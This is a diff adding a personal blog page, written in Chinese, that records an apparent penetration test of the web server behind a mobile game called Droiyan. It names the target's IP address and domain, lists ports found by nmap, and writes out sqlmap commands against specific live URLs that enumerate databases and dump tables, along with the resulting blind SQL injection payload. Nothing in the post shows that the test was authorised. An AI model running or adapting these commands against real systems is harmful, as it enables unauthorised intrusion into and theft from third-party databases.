@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Polly&#x27;s Blog</title>
+    <meta name="description" content="Wangbaoli">
+    <meta name="keywords" content="Polly, Blog, Baoli Wang">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/purecss@3.0.0/build/pure-min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/purecss@3.0.0/build/grids-responsive-min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
+    <!--<link rel="stylesheet" href="https://polly2014.github.io/css/style.css">-->
+    <link rel="stylesheet" href="https://polly2014.github.io/css/style_new.css">
+    
+</head>
+<body>
+    <div class="pure-g container">
+        <div class="sidebar pure-u-1 pure-u-md-1-5">
+            <div class="title">
+                <a class="pure-menu-heading" href=https://polly2014.github.io>
+                    <img class="avatar pure-img-responsive" src=https://polly2014.github.io/images/polly.png>
+                </a>
+                <div class="introduction">
+                    <p>Polly&#x27;s Blog</p>
+                </div>
+                <div class="nav">
+                    <ul class="nav-links">
+                        <li><a href=https://polly2014.github.io><i class="fas fa-home"></i>Home</a></li>
+                        <li><a href=https://polly2014.github.io/archive><i class="fas fa-archive"></i>Archive</a></li>
+                        <li><a href=https://polly2014.github.io/tags><i class="fas fa-folder"></i>Category</a></li>
+                        <li><a href=https://polly2014.github.io/blog><i class="fas fa-file-alt"></i>Posts</a></li>
+                        <li><a href=https://polly2014.github.io/publication><i class="fas fa-file-pdf"></i>Research</a></li>
+                        <li><a href=https://polly2014.github.io/about><i class="fas fa-info-circle"></i>About Me</a></li>
+                    </ul>
+                </div>
+                <div class="social">
+                    <ul class="social-links">
+                        <li><a href="mailto:26716201@qq.com"><i class="fas fa-envelope"></i></a></li>
+                        <li><a href="https://twitter.com/Polly__007"><i class="fab fa-twitter"></i></a></li>
+                        <li><a href="https://www.linkedin.com/in/baoliwang"><i class="fab fa-linkedin-in"></i></a></li>
+                        <li><a href="https://github.com/Polly2014"><i class="fab fa-github"></i></a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="content pure-u-1 pure-u-md-4-5">
+            
+    <div class="blog-post">
+        <h1>Droiyan手游渗透测试</h1>
+        <div class="content">
+            <h2 id="fu-wu-qi-ji-ben-xin-xi">服务器基本信息</h2>
+<ul>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">IP:</span><span> 43.154.160.115
+</span><span style="color:#bf616a;">domain:</span><span> http://gdr.xueyetang.com/
+</span></code></pre>
+</div>
+</li>
+</ul>
+<h2 id="nmapsao-yi-bian-huo-qu-kai-fang-duan-kou-xin-xi">Nmap扫一遍，获取开放端口信息</h2>
+<ul>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">80 </span><span style="color:#65737e;"># nginx
+</span><span style="color:#bf616a;">81
+</span><span style="color:#bf616a;">443
+</span><span style="color:#bf616a;">3306 </span><span style="color:#65737e;"># mysql
+</span><span style="color:#bf616a;">8010
+</span></code></pre>
+</div>
+</li>
+</ul>
+<h2 id="sqlmapkan-kan-you-mu-you-sqlzhu-ru-de-ke-neng">Sqlmap看看有木有SQL注入的可能</h2>
+<ul>
+<li>
+<p>步步为营，监测除了数据库、数据表</p>
+<ul>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">sqlmap -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent
+</span><span style="color:#bf616a;">sqlmap -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent --threads</span><span> 10</span><span style="color:#bf616a;"> --no-cast --dbs
+</span><span style="color:#65737e;"># sqlmap -u &quot;http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28&quot; --batch --random-agent -D &lt;database&gt; --tables
+</span><span style="color:#bf616a;">sqlmap -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent -D</span><span> qiyou_rswl_cc</span><span style="color:#bf616a;"> --tables
+</span><span style="color:#bf616a;">sqlmap -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent -D </span><span>&lt;database&gt; -T &lt;table&gt; --columns
+</span><span style="color:#bf616a;">sqlmap -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/apply.php?cid=22&amp;id=28</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent -D </span><span>&lt;database&gt; -T &lt;table&gt; --columns</span><span style="color:#bf616a;"> --dump
+</span></code></pre>
+</div>
+</li>
+<li>
+<p><img src="https://polly2014.github.io/hack-for-droiyan/image-20231228011029929.png" alt="image-20231228011029929" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>发现漏洞，开始注入</p>
+<ul>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">sqlmap</span><span> identified the following injection point(s) </span><span style="color:#bf616a;">with</span><span> a total of 543 HTTP(s) </span><span style="color:#bf616a;">requests:
+</span><span style="color:#bf616a;">---
+</span><span style="color:#bf616a;">Parameter:</span><span> id (GET)
+</span><span>    </span><span style="color:#bf616a;">Type:</span><span> boolean-based blind
+</span><span>    </span><span style="color:#bf616a;">Title:</span><span> MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)
+</span><span>    </span><span style="color:#bf616a;">Payload:</span><span> cid=22&amp;</span><span style="color:#bf616a;">id</span><span>=</span><span style="color:#a3be8c;">28 </span><span style="color:#bf616a;">AND</span><span> MAKE_SET(8520=8520,5339)
+</span><span style="color:#bf616a;">---
+</span><span style="color:#bf616a;">[01:25:45] </span><span style="color:#b48ead;">[</span><span>INFO</span><span style="color:#b48ead;">]</span><span> the back-end DBMS is MySQL
+</span><span style="color:#bf616a;">web</span><span> application technology: PHP 7.3.33
+</span><span style="color:#bf616a;">back-end</span><span> DBMS: MySQL Unknown (MariaDB fork)
+</span><span style="color:#bf616a;">[01:25:45] </span><span style="color:#b48ead;">[</span><span>WARNING</span><span style="color:#b48ead;">]</span><span> HTTP error codes detected during run:
+</span><span style="color:#bf616a;">502</span><span> (Bad Gateway) </span><span style="color:#bf616a;">-</span><span> 5 times
+</span><span style="color:#bf616a;">[01:25:45] </span><span style="color:#b48ead;">[</span><span>INFO</span><span style="color:#b48ead;">]</span><span> fetched data logged to text files under &#39;</span><span style="color:#a3be8c;">/Users/polly/.local/share/sqlmap/output/gdr.xueyetang.com</span><span>&#39;
+</span><span style="color:#bf616a;">[01:25:45] </span><span style="color:#b48ead;">[</span><span>WARNING</span><span style="color:#b48ead;">]</span><span> your sqlmap version is outdated
+</span></code></pre>
+</div>
+</li>
+<li>
+<p><img src="https://polly2014.github.io/hack-for-droiyan/image-20231228013128356.png" alt="image-20231228013128356" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="zhan-guo-fen-xi">战果分析</h2>
+<ul>
+<li>SQL注入点及数据库类型
+<ul>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">http://gdr.xueyetang.com/install/templates/js/forms.js
+</span><span style="color:#bf616a;">https://github.com/gaozhifeng/PHPMyWind
+</span></code></pre>
+</div>
+</li>
+<li><div style="overflow-x: auto; background-color: #2b303b;">
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">python</span><span> sqlmap.py</span><span style="color:#bf616a;"> -u </span><span>&quot;</span><span style="color:#a3be8c;">http://gdr.xueyetang.com/newsd.php?cid=5&amp;id=46</span><span>&quot;</span><span style="color:#bf616a;"> --batch --random-agent --threads</span><span> 10</span><span style="color:#bf616a;"> -f --no-cast
+</span></code></pre>
+</div></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+        <div class="navigation">
+            
+            
+        </div>
+    </div>
+
+        </div>
+    </div>
+</body>
+</html>
